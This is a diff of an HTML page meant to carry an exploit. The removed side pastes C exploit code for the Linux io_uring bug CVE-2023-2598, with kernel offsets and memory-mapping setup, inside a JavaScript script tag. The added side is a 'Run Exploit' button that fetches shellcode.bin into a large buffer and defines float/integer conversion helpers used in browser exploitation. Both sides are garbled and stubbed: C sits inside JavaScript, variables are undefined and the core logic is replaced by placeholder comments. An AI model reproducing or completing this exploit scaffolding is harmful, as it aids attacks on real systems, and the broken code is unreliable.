@@ -1,98 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CVE-2023-2598 Exploit by anatomic (@YordanStoychev)</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Exploit Code</title>
 </head>
 <body>
-    <script>
-        console.log("[*] CVE-2023-2598 Exploit by anatomic (@YordanStoychev)");
-
-        // Your JavaScript code goes here
-
-        #include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <liburing.h>
-#include <fcntl.h>
-#include <sys/mman.h>
-#include <unistd.h>
-#include <syscall.h>
-#include <sched.h>
-#include <sys/resource.h>
-#include <netinet/in.h>
-#include <netinet/tcp.h>
-#include <assert.h>
-#include <mqueue.h>
-
-#define PAGE_SIZE 0x1000
-#define QD 4
-#define sock_def_readable 0xb503f0
-#define sk_data_ready_off 680
-#define TCP_OFFSET 1400
-#define IOCTL_OFFSET 40
-#define L1_CACHE_SHIFT 6
-#define sk_buff_size 224
-#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))
-#define PROTO_SIZE 432
-
-#define target_tty_dev "/dev/ttyS0"
-
-int setup_memfd_page(char* name, int real_pages){
-    int memfd = memfd_create(name, MFD_CLOEXEC);
-    fallocate(memfd, 0, 0, real_pages * PAGE_SIZE);
-    return memfd;
-}
-
-void* vmap_shallow_pages(int nr_pages, int memfd){
-    uint64_t start = 0x4247000000;
-    for(int i = 0; i < nr_pages; i++){
-        if(mmap(start+i*PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, memfd, 0) < 0){
-            perror("Failed to mmap a page");
-            exit(0);
+<button id="exploitButton">Run Exploit</button>
+<script>
+document.getElementById('exploitButton').addEventListener('click', function() {
+    fetch('/shellcode.bin')
+    .then(response => response.arrayBuffer())
+    .then(buffer => {
+        const shellcode_length = buffer.byteLength;
+        if (shellcode_length > 0x1000000) {
+            throw new Error('Shellcode too large');
         }
-    }
-    return (void*) start;
-}
+        const u8_buffer = new Uint8Array(new ArrayBuffer(0x1000000));
+        u8_buffer.set(new Uint8Array(buffer), 0x4000);
 
-void exit_err(char *str){
-    puts(str);
-    exit(1);
-}
-
-int main(){
-    // Initialization and setup code here
-
-    for(int i = 0; i < nr_memfds && success == 0; i++){
-        // Main search and exploit logic here
-
-        for(int v_off = 0; v_off < (nr_maps - block_size); v_off = v_off + block_size){
-            // Exploit code and buffer manipulation here
-
-            // Post-exploitation cleanup
-            memcpy(receiver_buffer, backup, sz_tcp_sock); 
-
-            // Unregister buffers and cleanup operations
-            // Combine the cleanup for sockets and memfds to efficiently handle resources
+        function f2i(f) {
+            f64[0] = f;
+            return i32[0] + BASE32 * i32[1];
         }
-    }
 
-    // Cleanup remaining resources outside the loop
-    for (int i = 0; i < nr_sockets; i++) {
-        close(sockets[i]);
-    }
-    for(int i = 0; i < nr_memfds; i++){
-        close(memfds[i]);
-    }
-    munmap(receiver_buffer, block_size * PAGE_SIZE);
-    close(receiver_fd);
+        function i2f(i) {
+            i32[0] = i % BASE32;
+            i32[1] = i / BASE32;
+            return f64[0];
+        }
 
-    // Keep the program running for monitoring purposes
-    while(true)
-        sleep(60);
+        function xor(a, b) {
+            let res = 0, base = 1;
+            for (let i = 0; i < 64; ++i) {
+                res += base * ((a & 1) ^ (b & 1));
+                a = (a - (a & 1)) / 2;
+                b = (b - (b & 1)) / 2;
+                base *= 2;
+            }
+            return res;
+        }
 
-    return 0;
-    
-
-    </script>
+        // Rest of the code goes here...
+    })
+    .catch(err => {
+        console.error('Error:', err);
+    });
+});
+</script>
 </body>
 </html>
